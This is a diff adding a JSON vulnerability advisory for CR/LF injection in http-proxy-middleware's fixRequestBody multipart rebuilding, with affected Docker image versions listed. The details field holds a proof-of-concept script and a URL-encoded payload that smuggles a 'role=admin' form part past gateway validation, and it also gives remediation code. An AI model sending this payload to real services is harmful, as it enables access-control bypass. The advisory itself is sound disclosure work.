@@ -1,0 +1,145 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-vfsh-eqw5-2hkd-vbai",
+  "modified": "2026-10-06T19:00:44Z",
+  "published": "2026-10-06T19:00:44Z",
+  "upstream": [
+    "CVE-2026-55603"
+  ],
+  "summary": "## Summary",
+  "details": "## Summary\n`fixRequestBody()` is the library's documented helper for re-emitting a request body that was already consumed by a body parser. When the **outgoing** `Content-Type` is `multipart/form-data`, it rebuilds the body with `handlerFormDataBodyData()`, which interpolates each `req.body` key and value directly into the multipart wire format **without neutralizing CR/LF**:\n\n```js\n// dist/handlers/fix-request-body.js\nfunction handlerFormDataBodyData(contentType, data) {\n  const boundary = contentType.replace(/^.*boundary=(.*)$/, '$1');\n  let str = '';\n  for (const [key, value] of Object.entries(data)) {\n    str += `--${boundary}\\r\\nContent-Disposition: form-data; name=\"${key}\"\\r\\n\\r\\n${value}\\r\\n`;\n  }\n}\n```\n\nA `\\r\\n` inside a value (or key) lets an attacker close the current part and inject an **entirely new form part**. Because the proxy's own body parser saw a single opaque value, any gateway-side policy or validation performed on `req.body` is evaluated against a different set of fields than the upstream backend ultimately parses a request/parameter desynchronization across the trust boundary.\n\nBy contrast, the sibling output branches are safe: `application/json` uses `JSON.stringify` (escapes control chars) and `application/x-www-form-urlencoded` uses `querystring.stringify` (percent-encodes). Only the multipart branch lacks escaping.\n\n## Preconditions \nAll three must hold; this narrows real-world exposure and is the basis for `AC:H`:\n1. The proxy app populates `req.body` with a **non-multipart** parser (`express.urlencoded`, `express.json`, or text) so an injected boundary in a value is **not** split on input.\n2. The proxied (outgoing) request is sent as **`multipart/form-data`** (e.g. an adaptation layer, or any flow that sets the upstream content-type to multipart), so the vulnerable branch runs.\n3. The app calls `fixRequestBody` (the documented pattern for \"I body-parsed, now re-stream\"), and an attacker controls at least one body field value or key.\n\n> Note: a pure multipart-in → multipart-out flow (e.g. `multer`) is generally **not** exploitable for a *new-field* injection, because the proxy's multipart parser already splits the injected boundary, so `req.body` and the backend agree. The desync specifically requires a non-multipart input parser.\n\n## Impact\nWhen the preconditions hold, an attacker injects/overrides multipart fields seen only by the backend:\n- **Validation / access-control bypass** bypass gateway-side field checks (demonstrated below: a gateway that forbids `role=admin` is bypassed; backend grants admin).\n- **Parameter tampering** add or overwrite fields the backend trusts (IDs, flags, prices).\n- **File-part injection** inject a `filename=\"...\"` part into the upstream multipart stream.\n\n## Proof of Concept\n\n```js\n// npm i http-proxy-middleware@4.0.0   (Node ESM: save as minimal.mjs)\nimport { fixRequestBody } from 'http-proxy-middleware';\n\n// `req.body` as a NON-multipart parser (express.urlencoded / express.json) yields it.\n// The attacker sent  user=alice%0D%0A--BB%0D%0A...  so this ONE field's value holds CRLF:\nconst req = { readableLength: 0, body: {\n  user: 'alice\\r\\n--BB\\r\\nContent-Disposition: form-data; name=\"role\"\\r\\n\\r\\nadmin\\r\\n--BB--'\n}};\n\n// Minimal stand-in for the outgoing proxy request; capture what gets written.\nconst out = [];\nconst proxyReq = {\n  h: { 'content-type': 'multipart/form-data; boundary=BB' },\n  getHeader(n){ return this.h[n.toLowerCase()]; },\n  setHeader(n,v){ this.h[n.toLowerCase()] = v; },\n  write(d){ out.push(Buffer.from(d)); },\n};\n\nfixRequestBody(proxyReq, req);          // library rebuilds the multipart body\nconsole.log(Buffer.concat(out).toString());\n```\n\nOutput: one input field becomes **two** parts; `role=admin` was injected via the unescaped CRLF:\n\n```\n--BB\nContent-Disposition: form-data; name=\"user\"\n\nalice\n--BB\nContent-Disposition: form-data; name=\"role\"     <-- injected part; never present in req.body's keys\nadmin\n--BB--\n```\n\n`req.body` had a single key (`user`), so any gateway policy checking `req.body.role` passes, yet the backend's multipart parser receives `role=admin`. On the wire the attacker simply sends, as `application/x-www-form-urlencoded`: `user=alice%0D%0A--BB%0D%0AContent-Disposition:%20form-data;%20name=\"role\"%0D%0A%0D%0Aadmin%0D%0A--BB--`\n\n## Remediation\nNeutralize CR/LF (and `\"`) in keys/values before interpolation, or build the body with a real multipart encoder (e.g. `FormData` / `form-data`) instead of string concatenation. Minimal fix:\n\n```js\nfunction handlerFormDataBodyData(contentType, data) {\n  const boundary = contentType.replace(/^.*boundary=(.*)$/, '$1');\n  const bad = /[\\r\\n]/;\n  let str = '';\n  for (const [key, value] of Object.entries(data)) {\n    const v = String(value);\n    if (bad.test(key) || bad.test(v)) {\n      throw new Error('fixRequestBody: CR/LF not allowed in multipart field name/value');\n    }\n    str += `--${boundary}\\r\\nContent-Disposition: form-data; name=\"${key.replace(/\"/g, '%22')}\"\\r\\n\\r\\n${v}\\r\\n`;\n  }\n}\n```\n(Reject is preferable to silent stripping, to avoid masking malicious input.)",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kubeflow-pipelines-frontend",
+        "purl": "pkg:docker/dhi/kubeflow-pipelines-frontend?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "2.14.3-debian13",
+        "2.14.4-debian13",
+        "2.15.0-debian13",
+        "2.15.0-debian13-dev",
+        "2.16.0-debian13",
+        "2.16.0-debian13-dev",
+        "2.16.1-debian13",
+        "2.16.1-debian13-dev",
+        "2.5.0-node24-debian13"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kubeflow-pipelines-frontend",
+        "purl": "pkg:docker/dhi/kubeflow-pipelines-frontend?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "2.5.0-node24-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "prometheus",
+        "purl": "pkg:docker/dhi/prometheus?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "3.10.0-debian13",
+        "3.10.0-debian13-fips",
+        "3.11.0-debian13",
+        "3.11.0-debian13-fips",
+        "3.11.1-debian13",
+        "3.11.1-debian13-fips",
+        "3.11.2-debian13",
+        "3.11.2-debian13-fips",
+        "3.11.3-debian13",
+        "3.11.3-debian13-fips",
+        "3.12.0-debian13",
+        "3.12.0-debian13-fips",
+        "3.5.0-debian13",
+        "3.5.0-debian13-fips",
+        "3.5.1-debian13",
+        "3.5.1-debian13-fips",
+        "3.5.2-debian13",
+        "3.5.2-debian13-fips",
+        "3.5.3-debian13",
+        "3.5.3-debian13-fips",
+        "3.5.4-debian13",
+        "3.5.4-debian13-fips",
+        "3.6.0-debian13",
+        "3.7.0-debian13",
+        "3.7.1-debian13",
+        "3.7.2-debian13",
+        "3.7.3-debian13",
+        "3.8.0-debian13",
+        "3.8.0-debian13-fips",
+        "3.8.1-debian13",
+        "3.8.1-debian13-fips",
+        "3.9.0-debian13",
+        "3.9.0-debian13-fips",
+        "3.9.1-debian13",
+        "3.9.1-debian13-fips"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "prometheus",
+        "purl": "pkg:docker/dhi/prometheus?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "3.4.1-debian12",
+        "3.4.2-debian12",
+        "3.5.0-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "unleash",
+        "purl": "pkg:docker/dhi/unleash?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "7.6.3-debian13",
+        "7.6.3-debian13-dev",
+        "7.6.3-debian13-fips",
+        "7.6.3-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-vfsh-eqw5-2hkd-vbai"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-gcq2-9pq2-cxqm"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-gcq2-9pq2-cxqm"
+    }
+  ]
+}
